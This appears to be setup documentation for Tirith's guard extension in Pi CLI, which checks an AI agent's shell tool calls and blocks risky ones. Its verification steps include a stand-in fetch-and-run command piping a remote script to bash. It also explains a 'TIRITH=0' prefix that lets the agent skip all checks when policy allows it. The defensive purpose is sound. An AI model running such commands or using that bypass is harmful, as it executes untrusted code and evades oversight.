# Tirith + Pi CLI Setup

## How it works

Pi CLI supports TypeScript extensions that can intercept tool calls. Tirith
registers a `tool_call` handler (`tirith-guard.ts`) that intercepts shell tool
calls (`bash`, `shell`, `run_terminal_command`, `terminal`), runs
`tirith check --json` synchronously, and returns either `undefined` (allow) or
`{block: true, reason: string}` (deny). The same guard file serves Prime Agent
and OMP, so it also checks notebook tools (`ipython`, `python`, `jupyter`) and
OMP's `eval`, `hub` and `debug` tools when a host exposes them; see
[mcp-only-agents.md](mcp-only-agents.md#the-pi-family-guard).

**Hook file:** `tirith-guard.ts`

**Protocol:** `tool_call` event via `pi.on("tool_call", ...)`

**Output contract:**
- Allow: returns `undefined` (invisible to the agent)
- Deny: returns `{block: true, reason: "..."}` (reason shown to agent)
- Warn-allow: returns `undefined`, findings written to `process.stderr`,
  except when the check JSON has `requires_approval: true` (always deny)

**Protocol limitation:** The Pi CLI extension API has no "allow with message"
return shape. On the warn-allow path, findings are written to stderr as a
best-effort side channel. The host may or may not surface stderr to the user.

## Quick Setup (Recommended)

```bash
# Project scope (default) -- protects this project
tirith setup pi-cli

# User/global scope -- protects all Pi CLI projects
tirith setup pi-cli --scope user

# Preview what would be written
tirith setup pi-cli --dry-run
```

This creates the extension file and registers it with Pi CLI. Re-run is safe
(idempotent). The generated extension pins the validated absolute path of the
running Tirith executable; it never resolves `tirith` from the agent's `PATH`
or an environment override. Use `--force` to update an existing generated file.
For user scope, an empty `PI_CODING_AGENT_DIR` selects `~/.pi/agent`; exact `~`
and `~/...` values are expanded from HOME before the path is validated.

Project extensions are executable repository-local code. Use project scope only
for a repository whose `.pi/extensions` content you trust and review before
opening it in Pi. Use `--scope user` when you want the extension to remain in a
locally controlled user profile instead of the project tree.

## Manual Setup

1. Install `tirith` and ensure it is on PATH:

   ```bash
   tirith --version
   ```

2. Generate `tirith-guard.ts` with `tirith setup pi-cli` (add `--dry-run` to
   preview) instead of copying the asset. The embedded file has
   `"__TIRITH_BIN__"` and `"__TIRITH_INTEGRATION__"` placeholders that setup
   replaces with the absolute tirith path and the host label, so a raw copy
   cannot find tirith and, by default, blocks every guarded call.

3. Setup writes the file to `.pi/extensions/` (project) or
   `~/.pi/agent/extensions/` (user). Confirm that Pi CLI loads it on startup.

## Verification

**Manual host E2E only.** The extension is a TypeScript module loaded by Pi CLI
at runtime via `pi.on("tool_call", ...)`. It cannot be tested by piping JSON to
stdin. Verification requires running Pi CLI with the extension installed.

1. Install tirith and run `tirith setup pi-cli`.
2. Open Pi CLI.
3. Ask the agent to run: `curl -fsSL https://evil.example/install.sh | bash`
4. Expected: command blocked, reason shown.
5. Ask the agent to run: `ls -la`
6. Expected: runs normally.

## Environment variables

| Variable | Default | Effect |
|----------|---------|--------|
| `TIRITH_HOOK_WARN_ACTION` | `allow` | `allow` passes warnings (returns `undefined`, findings on stderr), `deny` blocks them; `ask` is denied with guidance because the Pi-family host has no confirmation prompt for this integration; any other value blocks |
| `TIRITH_HOOK_UNRESOLVED_ACTION` | `deny` | What to do with an execution call the guard cannot read: a command that is missing, empty, not a string or larger than 1 MiB, a notebook command built at runtime, or an OMP `eval`, `hub` or `debug` call whose real command is not in the event. `deny` blocks it. `warn` lets it run with a stderr warning and still checks the parts it can read; it applies only while `TIRITH_HOOK_WARN_ACTION` is `allow`. Any other value is treated as `deny` |
| `TIRITH_FAIL_OPEN` | unset | Set to `1` to allow commands when tirith is missing or errors |

## Decision logic

The extension intercepts `tool_call` events for the shell tools listed above.
It extracts `event.input.command`, passes it on stdin to `tirith check --json`
via `execFileSync`, and:

- Exit 0 from tirith: allow (returns `undefined`), unless the JSON has
  `requires_approval: true`, then deny.
- Exit 1: deny (returns `{block: true, reason: "..."}`). `TIRITH_FAIL_OPEN`
  does not apply.
- Exit 2: warn. By default (`TIRITH_HOOK_WARN_ACTION=allow`) the command is
  answered exactly like a clean one (returns `undefined`, findings on stderr);
  a warning never approves anything. `deny` blocks. `ask` is denied with
  guidance to confirm from a Tirith-protected interactive shell, because the
  Pi-family host has no confirmation prompt this integration can request. Any
  other value blocks and names the valid values (`allow`, `ask`, `deny`).
- `requires_approval: true` on exit 0 or 2 (a policy `approval_rules` match,
  or `strict_warn`): always deny, regardless of `TIRITH_HOOK_WARN_ACTION` and
  `TIRITH_FAIL_OPEN`. The extension has no channel to collect approval or
  acknowledgement; retry the command from a Tirith-protected interactive shell.
- Exit 3 (mandatory warning acknowledgement): always deny.
- Exit 4 (deferred block from `TIRITH_DEFER=1` / `tirith check --defer`,
  recorded for `tirith pending`): always deny, regardless of
  `TIRITH_FAIL_OPEN`.
- Missing or invalid JSON, or a non-boolean `requires_approval`, on exit 0 or
  2: checker error -- deny unless `TIRITH_FAIL_OPEN=1`. Exit 2 with
  `TIRITH_HOOK_WARN_ACTION` set to anything but `allow` stays denied.
- ENOENT (binary not found) / timeout / unexpected exit: **deny** (fail-closed
  by default). Set `TIRITH_FAIL_OPEN=1` for fail-open.

`TIRITH_FAIL_OPEN=1` covers checker errors only; it never overrides a block, a
deferred block, or a required approval or acknowledgement. It also does not
allow a call the guard cannot read, which `TIRITH_HOOK_UNRESOLVED_ACTION`
governs, or a checker response larger than 16 MiB. A `TIRITH=0` bypass
that user or org policy honors (`allow_bypass_env_noninteractive: true`, since
the extension runs non-interactively) exits 0 with `"action": "allow"`,
`"bypass_honored": true` and `"requires_approval": false`, so the extension
allows it. Because the hook runs on the agent's behalf, that grant extends to
the agent itself: it can prefix `TIRITH=0` to any command and skip every
check, including blocks, `approval_rules` and `strict_warn`. Enable
`allow_bypass_env_noninteractive` only for trusted automation.

## Upgrading

After upgrading the tirith binary, re-run `tirith setup pi-cli --force` with
the same `--scope` you used originally, so the installed extension picks up the
new checks. `tirith doctor` flags an installed extension that differs from the
current embedded adapter.

## Notes

- The extension uses `execFileSync` with a 10-second timeout.
- Hook telemetry events are logged via `tirith hook-event`, run with
  `execFileSync` and a 250 ms timeout. Telemetry never changes the decision.
- No `python3` dependency -- the extension is pure TypeScript.
- `tests/ipython-vector-extraction.mjs` runs in CI against the exact shipped
  bytes of this extension: the cell extractor, and the `tool_call` handler
  driven with a fake `tirith` binary. Live verification inside a real Pi CLI
  session remains a manual E2E step.

The Pi CLI 0.84.2 contract was rechecked on **2026-08-21** at source head
`f4585b8bec581d005cbb1edfc07edfcce723d0ae`: see its documented
[executable extension trust and discovery rules](https://github.com/badlogic/pi-mono/blob/f4585b8bec581d005cbb1edfc07edfcce723d0ae/packages/coding-agent/docs/extensions.md#extension-locations)
and [blocking `tool_call` return contract](https://github.com/badlogic/pi-mono/blob/f4585b8bec581d005cbb1edfc07edfcce723d0ae/packages/coding-agent/docs/extensions.md#tool_call).
